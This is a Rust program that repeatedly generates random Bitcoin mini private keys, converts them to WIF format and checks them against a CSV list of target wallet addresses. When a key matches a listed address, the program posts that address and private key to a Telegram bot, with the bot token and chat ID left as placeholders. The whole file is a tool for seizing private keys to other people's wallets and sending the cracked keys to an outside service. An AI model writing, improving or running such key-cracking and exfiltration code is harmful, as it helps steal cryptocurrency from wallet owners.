use sha2::{Sha256, Digest};
use base58::ToBase58;
use std::env;
use std::process;
use reqwest::Client;
use serde::Serialize;
use bitcoin::util::address::Address;
use bitcoin::util::key::PrivateKey;
use bitcoin::network::constants::Network;
use bitcoin::secp256k1::{Secp256k1, All};
use std::str::FromStr;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use std::error::Error;
use std::fs::File;
use std::io::Read;






//STRUCTS
#[derive(Debug, serde::Deserialize)]
struct Record {
    Address: String,
}

#[derive(Serialize)]
struct TelegramMessage {
    chat_id: String,
    text: String,
}

// FUNCTIONS //

// GENERATE KEYS
fn generate_random_key() -> String {
    let mut rng = thread_rng();
    let random_string: String = (0..21).map(|_| rng.sample(Alphanumeric) as char).collect();
    format!("S{}", random_string)
}


// CONVERT A MINIKEY TO IMPORTABLE FORMAT
fn mini_key_to_wif(mini_key: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(mini_key.as_bytes());
    let sha256_hash = hasher.finalize();
    let private_key_bytes = sha256_hash;
    let mut extended_key = vec![0x80];
    extended_key.extend_from_slice(&private_key_bytes);
    let first_sha256 = Sha256::digest(&extended_key);
    let second_sha256 = Sha256::digest(&first_sha256);
    let checksum = &second_sha256[0..4];
    extended_key.extend_from_slice(checksum);
    let wif_key = extended_key.to_base58();

    wif_key
}

// CHECK IF A COUPLE (ADDRESS/P2PHK KEY) IS VALID
fn validate_wif_and_address(wif_private_key: &str, public_address: &str) -> Result<bool, String> {
    let private_key = match PrivateKey::from_wif(wif_private_key) {
        Ok(key) => key,
        Err(_) => return Ok(false), 
    };

    let secp = Secp256k1::new();

    let public_key = private_key.public_key(&secp);
    let generated_address = Address::p2pkh(&public_key, Network::Bitcoin);

    let provided_address = Address::from_str(public_address)
        .map_err(|e| format!("Failed to parse public address: {}", e))?;

    Ok(generated_address == provided_address)
}

// NOTIFY ME WHEN A KEY IS FOUND
async fn send_telegram_message(token: &str, chat_id: &str, message: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let url = format!("https://api.telegram.org/bot{}/sendMessage", token);

    let msg = TelegramMessage {
        chat_id: chat_id.to_string(),
        text: message.to_string(),
    };

    let res = client.post(&url)
        .json(&msg)
        .send()
        .await?;

    println!("Response: {:?}", res.text().await?);
    Ok(())
}



#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let file_path = "Tracker_2024-07-24_08-14-22.csv";
    let mut file = File::open(file_path)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;

    let mut rdr = csv::Reader::from_reader(contents.as_bytes());
    let mut addresses = Vec::new();

    for result in rdr.deserialize() {
        let record: Record = result?;
        addresses.push(record.Address);
    }

    

    let telegram_token = "XXXXXX";
    let telegram_chat_id = "YYYYYYY";

    loop {
        let mini_key = generate_random_key();
        let wif_key = mini_key_to_wif(&mini_key);

        for address in &addresses {
           
            let result = validate_wif_and_address(&wif_key, &address);
            println!("Address: {},Key: {}, is valid? => {:?}", address,wif_key, result);

            if let Ok(true) = result {
                let message = format!("Wallet sbloccato! È stata trovata una chiave compatibile per il wallet {}! La chiave è {}", address, wif_key);
                send_telegram_message(telegram_token, telegram_chat_id, &message).await?;
            }
            
        }
    }

    Ok(())
}